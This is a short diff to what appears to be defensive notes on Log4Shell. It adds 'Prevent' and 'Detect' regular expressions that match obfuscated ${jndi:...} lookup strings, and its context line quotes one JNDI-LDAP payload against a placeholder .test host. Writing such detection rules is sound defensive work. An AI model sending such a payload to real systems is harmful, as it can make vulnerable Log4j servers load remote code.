@@ -24,8 +24,15 @@ ${jndi:ldap://{$date:YYYYMMddHHmmss}.test/a}
 
 Pattern match to capture all of above
 
+Prevent
 ```
 
 .*\$\{.{0,20}j.{0,20}n.{0,20}d.{0,20}i.{0,150}:.{0,5}\/.*\}
+
+```
+Detect
+```
+
+.*\$\{(\$\{.+j\}|j)(\$\{.+n\}|n)(\$\{.+d\}|d)(\$\{.+i\}|i)(\$\{.+:\}|:).*\/.*\}
 
 ```
